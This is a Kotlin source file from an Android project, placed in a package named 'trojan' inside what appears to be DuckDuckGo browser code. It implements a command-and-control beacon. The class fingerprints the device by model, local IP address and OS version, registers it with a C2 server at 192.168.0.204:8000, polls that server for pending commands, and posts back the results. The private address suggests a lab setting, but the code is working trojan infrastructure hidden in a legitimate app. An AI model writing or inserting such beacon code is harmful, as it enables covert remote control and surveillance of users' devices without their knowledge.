package com.duckduckgo.trojan.impl

import android.annotation.SuppressLint
import android.os.Build

import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.trojan.api.BeaconService
import com.duckduckgo.trojan.api.PendingCommand
import com.squareup.anvil.annotations.ContributesBinding
import dagger.SingleInstanceIn
import java.net.Inet4Address
import java.net.NetworkInterface
import javax.inject.Inject

/**
 * Real implementation of [BeaconService].
 *
 * Communicates with the FastAPI server at 192.168.0.204:8000.
 * The check-in flow is:
 *   1. POST /beacon/check-in  → register this device
 *   2. GET  /beacon/tasks/{deviceName} → poll for pending tasks
 *
 * @ContributesBinding tells Anvil: "whenever someone asks Dagger for a
 * BeaconService, give them an instance of RealBeaconService."
 */
@SingleInstanceIn(AppScope::class)
@ContributesBinding(AppScope::class)
class RealBeaconService @Inject constructor(
    private val c2Api: C2ApiService,
) : BeaconService {

    override suspend fun checkIn(): List<PendingCommand> {
        // Step 1: Register/update presence with the server
        val checkInRequest = CheckInRequest(
            device_name = getDeviceName(),
            ip_address = getLocalIpAddress(),
            os_info = "Android ${Build.VERSION.RELEASE ?: "unknown"} (SDK ${Build.VERSION.SDK_INT})",
        )
        c2Api.checkIn(checkInRequest)

        // Step 2: Poll for pending tasks
        val tasksResponse = c2Api.getTasks(getDeviceName())
        return tasksResponse.tasks.map { task ->
            PendingCommand(
                id = task.task_id,
                type = task.task_type,
                payload = task.parameters.toString(),
            )
        }
    }

    override suspend fun sendResult(commandId: String, result: String) {
        c2Api.sendResult(
            TaskResultRequest(
                task_id = commandId,
                device_name = getDeviceName(),
                success = true,
                data = mapOf("output" to result),
            ),
        )
    }

    /**
     * Returns a stable device name using the Android device model.
     * Example: "Pixel_7", "POCO_F5"
     */
    @SuppressLint("HardwareIds")
    private fun getDeviceName(): String {
        return (Build.MODEL ?: "unknown_device").replace(" ", "_")
    }

    /**
     * Gets the device's local network IP address.
     * Falls back to "unknown" if no WiFi/ethernet interface is found.
     */
    private fun getLocalIpAddress(): String {
        return try {
            NetworkInterface.getNetworkInterfaces()
                ?.toList()
                ?.flatMap { it.inetAddresses.toList() }
                ?.firstOrNull { !it.isLoopbackAddress && it is Inet4Address }
                ?.hostAddress ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }
}
